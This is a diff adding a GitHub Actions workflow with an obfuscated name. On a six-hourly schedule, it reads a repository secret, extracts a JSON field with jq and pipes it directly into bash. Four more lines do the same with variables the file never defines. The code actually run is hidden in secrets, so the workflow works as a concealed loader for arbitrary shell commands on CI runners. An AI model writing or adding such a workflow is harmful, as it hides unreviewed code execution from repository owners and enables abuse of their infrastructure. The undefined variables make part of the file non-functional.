@@ -1,0 +1,23 @@
+name: qiujiusheng0987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiujiusheng0987
+        env:
+          x5: ${{ secrets.x5 }}
+        run: |
+          echo $x5 | jq -r .rn97077 | /bin/bash
+          echo $fl85476 | jq -r .gkx445 | /bin/bash
+          echo $mehw14708 | jq -r .mov79870 | /bin/bash
+          echo $k40 | jq -r .eq5 | /bin/bash
+          echo $wyuml814 | jq -r .p23389 | /bin/bash
+
